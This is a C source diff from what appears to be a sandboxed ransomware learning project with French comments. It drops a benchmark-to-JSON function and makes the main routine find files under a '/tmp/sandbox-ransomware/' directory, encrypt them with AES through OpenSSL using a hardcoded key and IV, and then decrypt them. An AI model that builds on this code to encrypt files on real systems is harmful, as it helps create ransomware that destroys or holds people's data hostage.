@@ -2,49 +2,17 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <openssl/evp.h>
 
-#include "benchmark.h"
+#include "crypto_aes.h"
 #include "files_finder.h"
-
-char* json_body(char* p_identifier, benchmarkData* p_data, char* p_structKey) {
-    char* p_body = NULL;
-    p_body = (char*)malloc(250);
-    if (p_data == NULL)
-    {
-        sprintf(p_body, "{\"identifier\": \"%s\"}", p_identifier);
-    } else {
-
-        char* p_tmp = (char*)malloc(250);
-        /* Header json with identifier value */
-        sprintf(p_body, "{\n\"identifier\": \"%s\",\n", p_identifier);
-
-        /* Add the benchmark data */
-        sprintf(p_tmp, "\"%s\": {\n\t\"dataSize\": %d,\n\t", p_structKey, p_data->dataSize);
-        strcat(p_body, p_tmp);
-
-        sprintf(p_tmp, "\"cpuCore\": %d,\n\t", p_data->cpuCore);
-        strcat(p_body, p_tmp);
-
-        sprintf(p_tmp, "\"cpuMinFreq\": %f,\n\t", p_data->cpuMinFreq);
-        strcat(p_body, p_tmp);
-
-        sprintf(p_tmp, "\"cpuMaxFreq\": %f,\n\t", p_data->cpuMaxFreq);
-        strcat(p_body, p_tmp);
-
-        sprintf(p_tmp, "\"memorySize\": %d\n\t}\n", p_data->memorySize);
-        strcat(p_body, p_tmp);
-
-        strcat(p_body, "}");
-
-        free(p_tmp);
-    }
-
-    return p_body;
-}
 
 int main(int argc, char const *argv[])
 {
     /* code */
+
+    unsigned char* cle = "77e7b3e71fe30c9a1f653d67943bdd19a82bbada9f0ff804a325ff8515637cb3";
+    unsigned char* iv = "dc1ad035ef18bf8eeb4fde6d232dc51c";
 
     char* paths[] = {"/tmp/sandbox-ransomware/"};
     /* Initialisation de la structure pour la recherche de fichier */
@@ -56,14 +24,21 @@ int main(int argc, char const *argv[])
     /* Affichage des fichiers indexés */
     //print_path_data(p_listFileData);
 
-    /* Benchmark */
-    benchmarkData* p_data = benchmark_pc(p_listFileData->totalSize);
+    /* Génération structure clé de chiffrement */
+    EVP_CIPHER_CTX* p_e_ctx = load_encryption_key(cle, iv);
 
-    /* Print benchmark data */
-    printf("json_body: %s\n", json_body("test", p_data, "benchmark"));
+    /* Chiffrement aes */
+    aes_encrypt_files(p_listFileData, p_e_ctx);
+
+    /* Génération structure clé de déchiffrement */
+    EVP_CIPHER_CTX* p_d_ctx = load_decryption_key(cle, iv);
+
+    /* Déchiffrement aes */
+    aes_decrypt_files(p_listFileData, p_d_ctx);
 
     free_path_data(p_listFileData);
-    free(p_data);
+    EVP_CIPHER_CTX_free(p_e_ctx);
+    EVP_CIPHER_CTX_free(p_d_ctx);
 
     return 0;
 }
